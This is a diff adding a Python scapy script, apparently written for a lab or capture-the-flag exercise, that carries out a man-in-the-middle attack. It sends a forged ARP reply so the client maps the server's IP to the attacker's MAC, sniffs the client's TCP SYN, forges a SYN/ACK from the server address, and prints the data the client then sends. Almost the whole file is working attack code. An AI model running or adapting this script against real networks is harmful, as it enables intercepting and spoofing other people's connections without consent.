@@ -1,0 +1,50 @@
+from scapy.all import *
+import threading
+import time
+conf.verb = 0
+
+print("Update MAC addresses, idiot !")
+
+atk_mac = "1a:44:bb:ab:19:4f"
+broadcast = "ff:ff:ff:ff:ff:ff"
+
+client_ip = "10.0.0.2"
+client_mac = "66:b3:33:46:ce:11"
+
+server_ip = "10.0.0.3"
+
+# <psrc>(IP) is at hwsrc(MAC). Tell to pdst(IP) at hwdst(MAC)
+
+print("Sending ARP")
+sendp(Ether(src=atk_mac, dst=broadcast) / ARP(op=2, psrc=server_ip, hwsrc=atk_mac, pdst=client_ip, hwdst=client_mac))
+
+print("Sniffing TCP SYN")
+p = sniff(filter="tcp and host 10.0.0.2", count=1)
+p = p[0]
+
+dport = p.sport
+sport = 31337
+
+seq = 3302513910
+ack = p.seq + 1
+
+options = []
+for o in p[TCP].options:
+    if o[0] == "Timestamp":
+        ts = (o[0], (o[1][0], o[1][0]))
+        options.append(ts)
+    else:
+        options.append(o)
+
+print("Sending TCP SYN/ACK")
+
+p2 = Ether(src=atk_mac, dst=client_mac) / IP(src=server_ip, dst=client_ip) / TCP(sport=sport, dport=dport, ack=ack, seq=seq, flags="SA", options=options)
+ans = srp(p2)
+
+packets = sniff(filter="tcp and host 10.0.0.2", count=2) #, prn=lambda x: x.show())
+
+for p in packets:
+
+    if "P" in p[TCP].flags:
+        payload=p[Raw].load
+        print(f"Found payload : {payload.decode()}")
